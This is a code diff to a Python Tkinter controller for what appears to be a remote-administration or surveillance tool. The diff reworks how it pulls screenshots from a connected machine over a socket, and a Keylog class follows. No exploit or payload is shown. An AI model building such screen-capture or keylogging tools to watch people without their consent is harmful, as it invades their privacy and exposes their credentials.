@@ -3,6 +3,7 @@ from tkinter import messagebox
 from tkinter import filedialog
 from tkinter import ttk
 from PIL import ImageTk, Image
+import pyautogui
 import os
 import socket
 import win32api
@@ -213,14 +214,6 @@ class Pic(Toplevel):
         self.fr1.pack(side = LEFT,padx = 20, pady = 20)
 
         self.take()
-        # self.load = Image.open('temp.jpg')
-        # self.load = self.load.resize((550,400),Image.ANTIALIAS)
-        
-        # self.test_img = ImageTk.PhotoImage(self.load)
-        
-        # self.test_label = Label(self.fr1,image = self.test_img)
-        # self.test_label.image = self.test_img
-        # self.test_label.pack()
 
         self.fr2 = Frame(self)
         self.fr2.pack(side = RIGHT,padx=10,pady=10)
@@ -233,33 +226,36 @@ class Pic(Toplevel):
         self.protocol("WM_DELETE_WINDOW", self.on_closing)
 
     def take(self):
+        for widget in self.fr1.winfo_children():
+            widget.destroy()
         self.client.sendall(bytes(str('1'),'utf8'))
+
+        sizef = int(self.client.recv(2048).decode('utf8'))
+        self.client.sendall(bytes(str('1'),'utf8'))
+
+        w = int(self.client.recv(2048).decode('utf8'))
+        self.client.sendall(bytes(str('1'),'utf8'))
+
+        h = int(self.client.recv(2048).decode('utf8'))
+        self.client.sendall(bytes(str('1'),'utf8'))
+
+        data = self.client.recv(sizef)
+
+        self.img = Image.frombytes(mode = 'RGB',size=(w,h), data=data)
+        cre_img = self.img.resize((550,400),Image.ANTIALIAS)
         
-      
-        os.remove('temp.jpg')
-        temp = open('temp.jpg','xb')
-        buff = self.client.recv(2048)
-        while buff:
-                temp.write(buff)
-                buff = self.client.recv(2048)
-        temp.close()
+        render_img = ImageTk.PhotoImage(cre_img)
         
-        self.load = Image.open('temp.jpg')
-        cre = self.load.resize((550,400),Image.ANTIALIAS)
-        
-        self.render_img = ImageTk.PhotoImage(cre)
-        
-        self.img = Label(self.fr1,image = self.render_img)
-        self.img.image = self.render_img
-        self.img.pack()
+        self.label = Label(self.fr1,image = render_img)
+        self.label.image = render_img
+        self.label.pack()
         pass
 
     def save(self):
-        filename = filedialog.asksaveasfile(defaultextension = ".jpg")
+        filename = filedialog.asksaveasfilename(defaultextension = ".png")
         if not filename:
             return
-        edge = Image.fromarray(self.load)
-        edge.save(filename)
+        self.img.save(filename)
         pass
 
     def on_closing(self,func=None):
@@ -271,9 +267,7 @@ class Pic(Toplevel):
         else:
             func.grab_release()
             self.grab_set()
-            func.destroy()
-        f = open('test.jpg')
-        os.remove('test.jpg')        
+            func.destroy()       
         pass
 
 class Keylog(Toplevel):
